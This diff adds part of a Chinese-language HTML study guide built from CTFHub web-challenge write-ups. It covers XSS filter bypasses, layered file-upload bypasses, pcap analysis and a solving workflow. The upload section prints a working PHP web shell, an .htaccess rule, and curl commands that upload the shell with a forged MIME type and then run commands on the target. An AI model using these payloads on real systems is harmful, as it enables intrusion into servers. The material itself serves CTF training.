+        <thead><tr><th>过滤</th><th>可尝试</th><th>思路</th></tr></thead>
+        <tbody>
+          <tr><td>空格</td><td><code>%09</code>、<code>%0a</code>、<code>%0d</code>、<code>/</code></td><td>HTML 解析器不一定需要普通空格，标签和事件属性可换写法。</td></tr>
+          <tr><td><code>script</code> 关键字</td><td>大小写混写、<code>&lt;img&gt;</code>、<code>&lt;svg&gt;</code>、事件属性</td><td>不是只有 <code>&lt;script&gt;</code> 才能执行 JavaScript。</td></tr>
+          <tr><td><code>alert</code> 关键字</td><td><code>confirm</code>、<code>prompt</code>、DOM 操作、回调请求</td><td>先确认执行点，再换成实际外带代码。</td></tr>
+          <tr><td>普通引号</td><td>反引号、实体编码、URL 编码</td><td>要结合 HTML/JS 上下文，而不是盲目替换。</td></tr>
+          <tr><td>括号或点号</td><td>别名、模板字符串、事件调用、编码</td><td>DOM 型题尤其要查看已有 JS 变量和可利用函数。</td></tr>
+        </tbody>
+      </table>
+      <h4>易错点</h4>
+      <ul>
+        <li>把“服务器响应里有 Payload”误认为“浏览器一定执行了”。要看上下文和 CSP。</li>
+        <li>反射型题目只提交 Payload 给页面，忘记把最终 URL 交给 Bot。</li>
+        <li>存储型题目没有触发 Bot，或者把带 Payload 的 URL 再次编码错误。</li>
+        <li>DOM 型题目只盯服务器响应，没有在 Sources 里搜索 <code>innerHTML</code>、<code>eval</code>、<code>document.write</code>。</li>
+      </ul>
+    </section>
+
+    <section id="upload">
+      <h2>六、文件上传：逐层拆校验</h2>
+      <p><span class="tag">无限制</span><span class="tag">前端验证</span><span class="tag">MIME</span><span class="tag">文件头</span><span class="tag">扩展名绕过</span><span class="tag">.htaccess</span><span class="tag">00 截断/双写</span></p>
+      <h4>识别信号</h4>
+      <ul>
+        <li>页面有文件选择框或上传接口，上传成功后会返回文件名、相对路径或访问地址。</li>
+        <li>限制可能出现在前端 JS、请求的 <code>Content-Type</code>、文件扩展名、文件头、保存路径或服务器解析配置中。</li>
+        <li>上传目录可以直接访问，且服务器允许执行上传的脚本扩展名。</li>
+      </ul>
+      <h4>共同点</h4>
+      <p>文件上传题的通用目标是“让服务器保存一个可执行文件，再通过 Web 访问它”。每道题只是在不同层加了一个校验，因此最重要的是按层测试，而不是一开始就使用复杂 Payload。</p>
+      <h4>按顺序测试</h4>
+      <table>
+        <thead><tr><th>顺序</th><th>校验层</th><th>测试方式</th><th>可能的绕过</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>无校验</td><td>直接上传 <code>.php</code></td><td>访问返回路径，执行命令。</td></tr>
+          <tr><td>2</td><td>JS 前端验证</td><td>查看表单 JS，禁用 JS 或改请求</td><td>前端限制不影响服务端，直接构造上传请求。</td></tr>
+          <tr><td>3</td><td>MIME 验证</td><td>检查 multipart 的 <code>Content-Type</code></td><td>声明为 <code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>。</td></tr>
+          <tr><td>4</td><td>文件头验证</td><td>检查文件前几个字节</td><td>在前面加 <code>GIF89a</code> 或 JPEG/PNG 魔数，再放 PHP 代码。</td></tr>
+          <tr><td>5</td><td>扩展名黑名单</td><td>逐个测试可执行后缀</td><td><code>.phtml</code>、<code>.php5</code>、<code>.php7</code>、<code>.phar</code>、大小写、尾点/空格。</td></tr>
+          <tr><td>6</td><td>服务端关键字删除</td><td>构造嵌套关键字</td><td>双写，例如 <code>shell.pphphp</code> 经过一次删除后变成 <code>shell.php</code>。</td></tr>
+          <tr><td>7</td><td>路径/文件名拼接</td><td>控制上传目录或文件名参数</td><td>旧 PHP 环境尝试 <code>%00</code> 截断；现代环境通常无效。</td></tr>
+          <tr><td>8</td><td>解析规则限制</td><td>上传 <code>.htaccess</code></td><td>用 <code>AddType</code> 让图片后缀被当作 PHP 解析。</td></tr>
+        </tbody>
+      </table>
+      <h4>基础 Web Shell 与 .htaccess</h4>
+      <pre><code>&lt;?php system($_GET['cmd']); ?&gt;
+&lt;?php echo file_get_contents('/flag'); ?&gt;
+
+# .htaccess：让 .jpg 按 PHP 解析
+AddType application/x-httpd-php .jpg
+</code></pre>
+      <p>上传时可以用 cURL 明确控制文件名、MIME 和内容：</p>
+      <pre><code># 保持 .php 扩展名，但伪造 MIME
+curl -i -F "file=@shell.php;filename=shell.php;type=image/png" http://target/
+
+# 文件头检测：文件开头放 GIF89a，后面接 PHP 代码
+GIF89a&lt;?php system($_GET['cmd']); ?&gt;
+
+# 访问 Web Shell
+curl --get --data-urlencode "cmd=id" http://target/upload/shell.php
+</code></pre>
+      <h4>拿到命令执行后怎么找 Flag</h4>
+      <pre><code>id
+pwd
+ls -la
+find / -iname "*flag*" -type f 2&gt;/dev/null
+cat /var/www/html/flag_*.php
+</code></pre>
+      <div class="note"><p><strong>注意：</strong><code>Content-Type</code> 是客户端提交的，服务端只检查它就等于没有真正验证文件。文件头检测也一样，只检查前几个字节不代表文件是合法图片。</p></div>
+      <h4>易错点</h4>
+      <ul>
+        <li>只改扩展名，不检查服务器是否真的允许该后缀解析。</li>
+        <li>文件头 Payload 中把 <code>GIF89a</code> 放到 PHP 标签后面，导致检测失败。</li>
+        <li>00 截断依赖旧 PHP 版本；现代 PHP 会拒绝 NUL 字节路径，不能把历史技巧当成通用解法。</li>
+        <li>上传成功但不知道路径。要回看响应、Location、页面源码和上传目录。</li>
+      </ul>
+    </section>
+
+    <section id="traffic">
+      <h2>七、流量分析（6 题，Misc 辅助）</h2>
+      <p><span class="tag">MySQL</span><span class="tag">Redis</span><span class="tag">MongoDB</span><span class="tag">ICMP</span><span class="tag">Length</span><span class="tag">LengthBinary</span></p>
+      <h4>识别信号</h4>
+      <ul>
+        <li>题目提供 <code>.pcap</code>、<code>.pcapng</code> 或抓包数据，要求分析协议、载荷、长度或通信内容。</li>
+        <li>协议名出现在题名中，例如 MySQL、Redis、MongoDB；或者题目只给数据包，需要先看协议分布。</li>
+        <li>数据包长度、时间间隔、ICMP 载荷等字段有规律，可能承载隐写数据。</li>
+      </ul>
+      <h4>通用方法</h4>
+      <ol>
+        <li>先用 Wireshark 看 Protocol Hierarchy、Conversations 和 Endpoints，确定主要协议。</li>
+        <li>对感兴趣的 TCP/UDP 流使用 Follow Stream，观察请求与响应中的命令、字段和字符串。</li>
+        <li>协议题优先看命令与响应：MySQL 查询、Redis 命令、MongoDB 文档字段。</li>
+        <li>ICMP 题检查 Data 字段；Length 题检查数据包长度或长度差的二进制/ASCII 映射。</li>
+        <li>重复数据用 <code>tshark</code> 或 Python/Scapy 批量导出，再拼接还原。</li>
+      </ol>
+      <pre><code>tshark -r capture.pcap -Y "mysql" -T fields -e mysql.query
+tshark -r capture.pcap -Y "redis" -T fields -e redis.command
+tshark -r capture.pcap -Y "icmp" -T fields -e data.data
+tshark -r capture.pcap -T fields -e frame.len
+</code></pre>
+      <div class="note"><p><strong>价值：</strong>流量分析虽然不属于 Web，但能训练“协议字段 → 数据结构 → 还原信息”的思维。做 Web 日志、SQL 注入流量、Bot 回连分析时，这套方法会反复用到。</p></div>
+    </section>
+
+    <section id="workflow">
+      <h2>八、通用做题流程：新手建议固定成清单</h2>
+      <ol>
+        <li><strong>0. 保存基线：</strong>记录原始 URL、方法、Header、Cookie、响应长度和状态码。</li>
+        <li><strong>1. 信息收集：</strong>看页面源码、注释、JS、robots.txt、响应头、错误信息、Frame 和 Network 请求。</li>
+        <li><strong>2. 找输入点：</strong>参数、表单、Cookie、UA、Referer、上传、JSON、HTTP 方法。</li>
+        <li><strong>3. 打标记：</strong>提交唯一字符串，判断数据是否进入 SQL、HTML、文件路径、日志或存储。</li>
+        <li><strong>4. 判断类型：</strong>有回显、报错、布尔、时间、文件路径、脚本执行中的哪一种现象。</li>
+        <li><strong>5. 最小验证：</strong>先用一个简单 Payload 证明可行性，例如 <code>1=1</code>、<code>alert(1)</code>、合法图片头。</li>
+        <li><strong>6. 逐层绕过：</strong>每次只改一个变量，区分前端、MIME、文件头、黑名单、解析规则和路径限制。</li>
+        <li><strong>7. 获取 Flag：</strong>检查响应、源码、数据库、Cookie、上传文件、服务器文件和流量载荷。</li>
+        <li><strong>8. 写复盘：</strong>记录最终请求、Payload、判断依据、失败尝试、原理和修复建议。</li>
+      </ol>
+      <h4>Flag 常见位置</h4>
+      <ul>
+        <li>HTTP 响应正文、HTML 注释、JS 变量、响应头、Location、Set-Cookie。</li>
+        <li>数据库表字段、<code>information_schema</code> 枚举出的业务表、SQL 报错信息。</li>
+        <li>Git/SVN/HG 的旧提交、stash、悬空对象、被删除文件。</li>
+        <li>服务器上的 <code>/flag</code>、<code>flag.php</code>、<code>flag_*.php</code> 或环境变量。</li>
+        <li>Bot/管理员 Cookie，或通过回调服务器收到的查询参数。</li>
+        <li>PCAP 中的数据包载荷、协议命令、响应内容或长度编码。</li>
+      </ul>
+    </section>
+
+    <section id="tips">
+      <h2>九、常用技巧速查</h2>
+      <h4>9.1 编码与符号</h4>
+      <table>
+        <thead><tr><th>字符/场景</th><th>常见写法</th><th>注意</th></tr></thead>
+        <tbody>
+          <tr><td>URL 中的 <code>#</code></td><td><code>%23</code></td><td>不编码时浏览器把它当作 URL 片段。</td></tr>
+          <tr><td>空格</td><td><code>%20</code>、<code>+</code>、<code>/**/</code>、<code>%09</code>、<code>%0a</code></td><td>不同上下文对空格的解释不同。</td></tr>
+          <tr><td>路径穿越</td><td><code>../</code>、<code>%2e%2e%2f</code>、<code>%252e%252e%252f</code></td><td>先观察过滤发生在解码前还是解码后。</td></tr>
+          <tr><td>SQL 注释</td><td><code>#</code>、<code>-- </code>、<code>/*...*/</code></td><td><code>--</code> 后通常需要空格。</td></tr>
+          <tr><td>字符串替代</td><td><code>0x666c6167</code>、<code>char()</code></td><td>用于绕过引号或关键字黑名单。</td></tr>
+        </tbody>
+      </table>
+      <h4>9.2 工具分工</h4>
+      <table>
+        <thead><tr><th>工具</th><th>最适合做什么</th><th>不要做什么</th></tr></thead>
+        <tbody>
+          <tr><td>浏览器 DevTools</td><td>看源码、Network、Cookie、JS Source/Sink</td><td>不要只看渲染结果。</td></tr>
+          <tr><td>Burp Suite</td><td>拦截、改写、重放请求，观察响应差异</td><td>不要不看请求就盲目扫。</td></tr>
+          <tr><td>cURL</td><td>精确复现请求、控制 Header/方法/文件上传</td><td>注意 Windows 下换行和引号。</td></tr>
+          <tr><td>dirsearch/gobuster/ffuf</td><td>目录、文件、备份、版本库入口探测</td><td>不要用超大字典拖慢环境。</td></tr>
+          <tr><td>GitHack/git-dumper/dvcs-ripper</td><td>恢复 Git/SVN/HG 元数据</td><td>恢复后要查全部分支和历史。</td></tr>
+          <tr><td>Python requests</td><td>盲注、批量请求、二分查找、回调验证</td><td>不要忽略超时和重试。</td></tr>
+          <tr><td>Wireshark/tshark</td><td>协议分析、Follow Stream、字段导出</td><td>不要只凭肉眼扫包，优先过滤。</td></tr>
+        </tbody>
+      </table>
+      <div class="callout"><p><strong>最重要的一条：</strong>任何 Payload 都要能解释“为什么这样写”。如果只知道复制，题目稍微改一个过滤就会失效；知道上下文、输出位置和过滤逻辑，才能自己推导新 Payload。</p></div>
+    </section>
+
+    <section id="mistakes">
+      <h2>十、新手常见误区</h2>
+      <ul>
+        <li><strong>只看页面文字：</strong>源码、注释、响应头和 Network 请求经常比正文更重要。</li>
+        <li><strong>不做对照：</strong>只发一次 Payload 就下结论，没有真/假、正常/异常、前/后的比较。</li>
+        <li><strong>把前端验证当安全：</strong>JS 校验、HTML 提示和按钮禁用都可以绕过，真正的校验在服务端。</li>
+        <li><strong>把黑名单当完整防护：</strong>过滤空格不等于防 XSS，过滤 <code>php</code> 一次不等于防双写，过滤 MIME 不等于检查文件内容。</li>
+        <li><strong>盲目爆破：</strong>密码题应先识别产品和错误特征；SQL 盲注应脚本化，不要手点几百次。</li>
+        <li><strong>忽略编码层级：</strong>外层 URL 编码、内层参数编码和 HTML 实体编码经常叠加。</li>
+        <li><strong>只记答案：</strong>Flag 是动态的，真正可复用的是判断流程和 Payload 模板。</li>
+      </ul>
+    </section>
+
+    <section id="roadmap">
+      <h2>十一、下一阶段路线图</h2>
+      <p>当前阶段已经把最常见的 Web 入口跑通：HTTP 基础、信息泄露、密码口令、SQL 注入、XSS、文件上传。下一步不要急着堆新工具，先把这些题型做到“能解释、能复现、能脚本化”。</p>
+      <table>
+        <thead><tr><th>阶段</th><th>学习重点</th><th>建议目标</th></tr></thead>
+        <tbody>
+          <tr><td>巩固期</td><td>HTTP、信息泄露、密码口令</td><td>不查 Writeup 也能复现请求；会用 cURL/Burp 精确控制请求。</td></tr>
+          <tr><td>注入期</td><td>SQL 注入的 Union、报错、布尔、时间、Header、过滤绕过</td><td>能独立写一个盲注脚本；能解释每种注入的判断依据。</td></tr>
+          <tr><td>前端期</td><td>XSS 反射/存储/DOM、上下文、Bot 外带</td><td>能画出攻击链；能处理常见空格和关键字过滤。</td></tr>
+          <tr><td>文件期</td><td>文件上传的多层校验与解析规则</td><td>能按“扩展名 → MIME → 文件头 → 路径 → 解析”逐层测试。</td></tr>
+          <tr><td>进阶期</td><td>命令执行、文件包含、SSRF、SSTI、XXE、反序列化</td><td>理解“输入点 → 服务端危险函数 → 回显/外带”的统一模型。</td></tr>
+          <tr><td>审计期</td><td>代码审计、JWT/Session、访问控制、WAF 绕过</td><td>能从源码定位漏洞，而不是只依赖黑盒探测。</td></tr>
+        </tbody>
+      </table>
+      <h4>建议的练习节奏</h4>
+      <ol>
+        <li>每次只做 1～2 道新题，做完立刻写最小复盘。</li>
+        <li>第二天不看 Writeup 重新复现一次，重点看自己卡在哪一层。</li>
+        <li>把重复出现的手工步骤写成 Python 脚本或 Burp 宏。</li>
+        <li>每周把新题归入本文某个大类，并补充新的“识别信号”和“绕过方式”。</li>
+      </ol>
+    </section>
+
+    <section id="review-template">
+      <h2>十二、错题复盘模板</h2>
+      <pre><code>题目：
+题型：
+入口 / 可控输入：
+正常现象：
+异常现象：
+判断依据：
+最终请求：
+最终 Payload：
+绕过点：
+失败尝试：
+根因：
+修复建议：
+可复用套路：
+</code></pre>
+      <h4>最后自检</h4>
+      <ul>
+        <li>我能不用看 Writeup 说出这道题属于哪个大类吗？</li>
+        <li>我能指出输入点、处理逻辑、回显方式和过滤层吗？</li>
+        <li>我能解释最终 Payload 的每一部分吗？</li>
+        <li>如果题目改掉一个过滤条件，我能推导新的绕过方式吗？</li>
+        <li>我是否记录了可复现的请求，而不是只保存了 Flag？</li>
+      </ul>
+      <div class="note"><p><strong>阶段结论：</strong>新手阶段最值得建立的能力不是“记住更多 Payload”，而是形成固定的判断顺序：先看请求和响应，再找输入点，再判断数据流向，最后针对过滤层逐层绕过。做到这一点，遇到没见过的 Web 题也不会完全无从下手。</p></div>
+    </section>
+
+    <footer>
+      基于本仓库 CTFHub 题解整理 · 仅用于授权 CTF 环境与安全学习 · 更新于 2026-09-23
+    </footer>
+  </main>
+</body>
+</html>
